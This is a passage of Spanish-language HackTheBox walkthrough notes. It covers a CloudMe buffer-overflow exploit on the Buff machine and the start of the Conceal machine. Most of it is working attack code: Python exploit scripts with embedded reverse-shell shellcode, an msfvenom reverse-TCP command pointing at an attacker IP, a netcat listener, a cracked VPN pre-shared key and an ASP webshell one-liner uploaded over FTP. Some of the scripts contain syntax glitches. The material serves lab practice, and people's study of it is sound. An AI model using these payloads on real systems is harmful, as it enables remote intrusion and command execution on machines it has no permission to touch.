    k7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep
    9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1
    Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3F
    a4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff
    6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8
    Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0F
    q1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv
    3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5
    Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7G
    f8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

Una vez mas tenemos que lanzar el CloudMe porque previamente a petado. Tambien tenemos nuevamente que attachear al Immunity Debugger el servicio CloudMe.
Lanzamos el script y vemos que el valor del EIP vale `316A4230`

Con la herramienta `pattern_offset` podemos comprovar cuantas **A** tengo que meter antes de sobre escribir la EIP

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230

#Output
[*] Exact match at offset 1052
```

Ahora que tenemos el offset, vamos a modificar el script.

#### Etapa 4: Encontrar la direccion donde despues del EIP {-}

Aqui despues de añadir las **A** que tiene que tener 1052 de offset y las 4 **B** que seria el EIP, vamos a añadir
500 **C** para buscar la direccion donde se sobre escribe el resto del programa. 

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    offset = 1052
    before_eip = b"A" * offset
    eip = b"B" * 4
    after_eip = b"C" * 500

    payload = before_eip + eip + after_eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

Si lanzamos el script, vemos en el Immunity debugger que el EIP vale ahora 42424242, es el punto donde savemos que tenemos el control
del EIP. Ahora la pregunta es, que tiene que valer el EIP para poderle injectar los commandos que queremos. Pues en el Immunity debugger, 
que el **ESP** contiene un monton de **C**. el ESP es la Stack. Si le hacemos un click derecho a la direccion y les damos a **Follow in Dumb**, 
en la parte baja de la izquierda vemos todas la **C** en formato raw.

Al final aqui la direccion a la cual tenemos que appuntar es a la **ESP** `0x0022D470` que es la pilla. El problema es que no podemos simplemente ponerle al
EIP la direccion del ESP porque esto no va a funccionar. Tendremos aqui que usar un concepto que se llama **OPCODE**. El **OPCODE** son instrucciones
a bajo nivel que nos permitte hacer un Jump al ESP llamado **JMPESP**.

Pero antes de mirrar el **OPCODE**, vamos a preparar el script malicioso que queremos ejecutar.

#### Etapa 5: Preparacion del codigo malicioso {-}

Como atacante, no queremos que el programa nos interprete una serie de **C** pero un codigo malicioso en caracteres Hexadecimal. 
El problema que puede surgir, es que algunos caracteres no se logren interpretar por el programa. Estos carateres son llamados **BadChars**.
Tenemos que empezar por buscar estos **BadChars**.

1. Configurar el entorno de trabajo con mona

    A bajo de la ventana del Immunity Debugger, podemos entrar commandos. Aqui creamos un directorio para poder trabajar correctamente

    - `!mona config -set workingfolder C:\Users\S4vitar\Desktop\%p`

    <div class="figure">
    <img src="images/Buff-mona_set_wdir.png" alt="Mona Set working directory" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-40)Mona Set working directory</p>
    </div>

1. Utilizamos mona para crear una lista de todos los caracteres en Hexadecimal

    ```bash
    !mona bytearray -cpb "\x00"
    ```

    Aqui mona nos crea un fichero llamado bytearray` en el escritorio que contiene todos los valores en Hex del 01 al FF. Por prevencion
    quittamos de entrada el caracter `x00` que es un **BadChars** bastante commun.

1. Enviamos todos estos caracteres en la pila para ver en que punto, o mejor dicho que carateres hacen quel programa pete.

    ```python
    #!/usr/bin/python3

    import socket
    import signal
    import pdb
    import sys
    import time

    from pwn import *
    from struct import pack

    # Variables globales
    remoteAddress = "127.0.0.1"

    def executeExploit():
        badChars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0 \xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
        offset = 1052
        before_eip = b"A" * offset
        eip = b"B" * 4

        payload = before_eip + eip + badChars

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)

    if __name__ == "__main__":
        executeExploit()
    ```

1. En el Immunity debugger con mona miramos que caracteres no an sido interpretado

    <div class="figure">
    <img src="images/Buff-BadChars.png" alt="Buf Bad chars" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-41)Buf Bad chars</p>
    </div>

    ```bash
    !mona compare -f C:\Users\S4vitar\Desktop\CloudMe\bytearray.txt -a 0022D470
    ```

En el caso que nos reporte **BadChars** tendriamos que quitarlos de la lista y volver a effectuar lo mismo hasta que no
tengamos mas **BadChars**. Y desde aqui nos podemos crear el script malicioso con la lista de caracteres que tenemos. En 
este caso no hay **BadChars** pero le quitaremos siempre el `\x00` por precaucion.

#### Etapa 6: Creacion del shell code malicioso {-}

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.16 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c
```

<div class="figure">
<img src="images/Buff-Shell-code.png" alt="Buf Shell code" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-42)Buf Shell code</p>
</div>

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time
from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
        b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
        b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
        b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
        b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
        b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
        b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
        b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
        b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
        b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
        b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
        b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
        b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
        b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
        b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
        b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
        b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
        b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
        b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
        b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
        b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
        b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
        b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
        b"\xb0\xbc\x3b\xba\xb1\x94")
    offset = 1052
    before_eip = b"A" * offset
    eip = b"B" * 4

    payload = before_eip + eip + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

#### Etapa 6: Asignar el opcode al EIP {-}

<div class="figure">
<img src="images/Buff-jmpesp.png" alt="Buf opcode" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-43)Buf opcode</p>
</div>

Como dicho precedamente, no podemos meter la direccion del **ESP** directamente en el **EIP** para ejecutar el Shell code.
Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el commando **JMPESP** para redirigirnos al Shell code.

1. Busqueda de modulos con mona

    ```bash
    !mona modules
    ```

1. Buscamos una dll que tenga todas las protecciones a False

    <div class="figure">
    <img src="images/Buff-protection_false.png" alt="Buf no protected modules" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-44)Buf no protected modules</p>
    </div>

1. En internet buscamos el opcode [defuse.ca](https://defuse.ca/online-x86-assembler.htm)

    <div class="figure">
    <img src="images/Buff-protection_false.png" alt="Buf no protected modules" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-45)Buf no protected modules</p>
    </div>

1. Buscar el opcode (en este caso `ff e4`) en la dll.

    ```bash
    !mona find -s "\xff\xe4" -m Qt5Core.dll
    ```

1. Seleccionar una direccion que tenga derechos de ejecucion

    <div class="figure">
    <img src="images/Buff-execution-rights-jmpesp.png" alt="Buf exec right jmpesp" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-46)Buf exec right jmpesp</p>
    </div>

1. Cambiamos el script poniendole la nueva direccion

    ```python
    #!/usr/bin/python3

    import socket
    import signal
    import pdb
    import sys
    import time
    from pwn import *
    from struct import pack

    # Variables globales
    remoteAddress = "127.0.0.1"

    def executeExploit():
        shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
            b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
            b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
            b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
            b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
            b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
            b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
            b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
            b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
            b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
            b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
            b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
            b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
            b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
            b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
            b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
            b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
            b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
            b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
            b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
            b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
            b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
            b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
            b"\xb0\xbc\x3b\xba\xb1\x94")
        offset = 1052
        before_eip = b"A" * offset
        eip = pack("<I", 0x68a98a7b)

        payload = before_eip + eip + shellcode

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)

    if __name__ == "__main__":
        executeExploit()
    ```

Aqui hay que tener en cuenta el echo que nuestra shell code esta cifrada y que tenemos que dejar un margen para que cuando
el codigo nos salte al ESP tenga tiempo para desencryptar el codigo. Para esto tenemos dos possibilidades.

- Añdir al shell code unos No Operation code **NOPS**
- Effectuar un desplazamiento de la pila con la instruccion `sub esp, 0x10`

Que simplemente es, en el caso de las NOPS, añadir codigo que no hace nada. Se hacen con el caracter Hexadecimal `\x90`

```python
 #!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time
from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    shellcode = ()
    offset = 1052
    before_eip = b"A" * offset
    eip = pack("<I", 0x68a98a7b)
    nops = b"\x90"*16

    payload = before_eip + eip + nops + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

o en el caso del desplazamiento de la pila

```python
 #!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time
from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    shellcode = (shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
        b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
        b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
        b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
        b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
        b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
        b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
        b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
        b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
        b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
        b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
        b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
        b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
        b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
        b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
        b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
        b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
        b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
        b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
        b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
        b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
        b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
        b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
        b"\xb0\xbc\x3b\xba\xb1\x94"))
    offset = 1052
    before_eip = b"A" * offset
    eip = pack("<I", 0x68a98a7b)

    payload = before_eip + eip + b"83ec10" + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```


<!--chapter:end:17-Buff/17-04-BufferOverflow.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

#### Etapa final: Ejecucion del script final {-}

1. Nos ponemos en escucha en el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Ejecutamos el script

    ```bash
    python3 exploit.py
    ```

Y ya emos ganados accesso al systema como el usuario que ha lanzado el servicio.
Se puede ahora cambiar el script para que apunte a la maquina victima y ejecutar otra vez el msfvenom para que 
appunte a la buena ip y estamos como administrator.

<!--chapter:end:17-Buff/17-05-PrivilegeEscalation.Rmd-->

# Conceal {-}

## Introduccion {-}

La maquina del dia 10/08/2021 se llama Conceal
.

El replay del live se puede ver aqui

[![S4vitaar Conceal maquina](https://img.youtube.com/vi/RtztYLMZMe8/0.jpg)](https://www.youtube.com/watch?v=RtztYLMZMe8)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:18-Conceal/18-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.116
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.116
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.116
```

Aqui vemos que no hay ningun puerto abiertos por TCP, controllamos si hay puertos abiertos por UDP

```bash
nmap -p- -sU --min-rate 10000 --open -n -Pn 10.10.10.116
nmap -sU -p500 -sC -sV 10.10.10.116 -oN udpScan
```

Aqui hemos encontrado el puerto 500 pero siempre vamos a intentar ver si el puerto 161 que NMAP no siempre lo reporta como abierto
porque puede ser filtered. Utilizamos la heramienta **onesixtyone** para intentar ver si conseguimos ver la *Community String* del servicio.

```bash
onesixtyone 10.10.10.116
```

Aqui vemos que el servicio esta habilitado y que su **Community string** es la public

| Puerto    | Servicio          | Que se nos occure?                          | Que falta? |
| --------- | ----------------- | ------------------------------------------- | ---------- |
| 161 (UPD) | snmp              | Enumeracion de informacion con la CS Public |            |
| 500 (UPD) | IKE vpn tunneling | Conneccion por VPN                          |            |


### Enumeracion de informacion por puerto 161 con la CS public {-}

```bash
snmpwalk -c public -v2c 10.10.10.116
```

De seguida aqui vemos un hash para un VPN. Lo copiamos en nuestra maquina de attackante y vamos a tirar de RainbowTables (claves precomputadas)
para desencryptar el hash. [crackstation](https://crackstation.net)

Esto nos a permitido encrontrar el valor del hash.


### Enumeracion del puerto 500 {-}

Como aqui hemos encontrado el valor del hash para la conneccion por VPN, vamos a enumerar el puerto 500. Para esto, buscamos por internet
si existe un ike scan en github y lo encontramos. Intentando saver si viene de forma nativa en Parrot o Kali vemos que es el caso.

```bash
ike-scan 10.10.10.116
```

nos pone un mensaje de error y si le hacemos un `strace ike-scan 10.10.10.116` vemos que el error viene de nuestra maquina.
Si le hacemos un `lsof -i:500` vemos que effectivamente nuestra maquina de atacante ya esta usando el puerto 500 que se llama charon.
le hacemos un `pkill charon` y volmemos a hacerle un `ike-scan 10.10.10.116` ya vemos cosas pero de forma turbia.

```bash
pkill charon
ike-scan -M 10.10.10.116 | tee output
```

<div class="figure">
<img src="images/Conceal-ike-scan.png" alt="ike scan output" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-47)ike scan output</p>
</div>

Aqui ya vemos todas las informaciones necessarias para podernos crear unos ficheros de configuracion para connectarnos por VPN.

### Creamos los ficheros de configuracion para la VPN {-}

Los dos ficheros que tenemos que tocar para configurar la VPN son:

- el fichero `/etc/ipsec.secrets` para la authentificacion
- el fichero `/etc/ipsec.conf` para la configuracion

Si buscamos por internet como se configura el fichero ipsec.secrets y encontramos algo el la web [systutorials](https://www.systutorials.com/docs/linux/man/5-ipsec.secrets)

<div class="figure">
<img src="images/Conceal-ipsec-secrets-web.png" alt="info ipsec.secrets" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-48)info ipsec.secrets</p>
</div>

Añadimos lo siguiente en nuestro fichero `/etc/ipsec.secrets`

```bash
%any : PSK "Dudecake1!"
```

y en el fichero de configuracion `/etc/ipsec.conf`

```bash
conn conceal
        ike=3des-sha1-modp1024
        esp=3des-sha1
        type=transport
        auto=add # ondemand start
        authby=secret
        keyexchange=ikev1
        left=10.10.14.8
        right=10.10.10.116
```

Ahora intentamos connectarnos

```bash
ipsec restart
ipsec up conceal
```

Nos da un error. Intentamos forzar la conneccion por tcp.

```bash
conn conceal
        ike=3des-sha1-modp1024
        esp=3des-sha1
        type=transport
        auto=add # ondemand start
        authby=secret
        keyexchange=ikev1
        left=10.10.14.8
        right=10.10.10.116
        rightsubnet=10.10.10.116[tcp]
```

```bash
ipsec restart
ipsec up conceal

#Output
connection 'conceal' established successfully
```

### Enumeracion con nmap por sondeo TCP connect {-}

Como ya estamos connectados, vamos a poder rescannear la maquina con nmap. El problema es que como estamos por VPN.
el paramettro `-sS` no va a funccionar. Tenemos que pasar por un sondeo TCP connect

```bash
nmap -sT --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.116 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p21,80,135,139,445,49664,49666,49667,49668,49669 10.10.10.116 -oN targeted.
```

| Puerto | Servicio | Que se nos occure?             | Que falta? |
| ------ | -------- | ------------------------------ | ---------- |
| 21     | ftp      | Conneccion anonyma             |            |
| 80     | http     | Web, fuzzing                   |            |
| 135    | msrpc    |                                |            |
| 139    | netbios  |                                |            |
| 445    | smb      | Null session                   |            |
| 49664  | msrpc    | Puertos por defecto de windows |            |
| 49665  | msrpc    | Puertos por defecto de windows |            |
| 49666  | msrpc    | Puertos por defecto de windows |            |
| 49667  | msrpc    | Puertos por defecto de windows |            |
| 49668  | msrpc    | Puertos por defecto de windows |            |
| 49669  | msrpc    | Puertos por defecto de windows |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.116
```

Nada muy interressante aqui


#### Checkear la web {-}

Sabemos que es un IIS 10.0 pero poco mas. Vamos a fuzzear routas.

#### Fuzzing con WFuzz {-}

Fuzzeamos el puerto 80

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.116/FUZZ
```

Encontramos un routa `/upload`

Si miramos con firefox vemos que tenemos capacidad de directory listing pero no hay nada. Intentamos subir cosas por ftp 
a ver si se nos lista aqui.

### Conneccion anonyma por FTP {-}

```bash
ftp 10.10.10.116
Name: anonymous
dir
ls -la
```

En otro terminal creamos un fichero de prueba `echo "EEEEE" > prueba.txt` y lo subimos por ftp.

```bash
put prueba.txt
```

Si miramos en la web en la direccion `/upload` podemos ver el fichero prueba.txt.



<!--chapter:end:18-Conceal/18-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Conneccion anonyma por FTP {-}

```bash
ftp 10.10.10.116
Name: anonymous
dir
ls -la
```

En otro terminal creamos un fichero de prueba `echo "EEEEE" > prueba.txt` y lo subimos por ftp.

```bash
put prueba.txt
```

Si miramos en la web en la direccion `/upload` podemos ver el fichero prueba.txt.

### Remote Code execution con fichero asp {-}

Buscamos una reverse shell con la pagina web [hackingdream](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html)
y vemos el oneliner para la webshell asp.

```bash
vi s4vishell.asp

<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

lo subimos con ftp

```bash
put s4vishell.asp
```

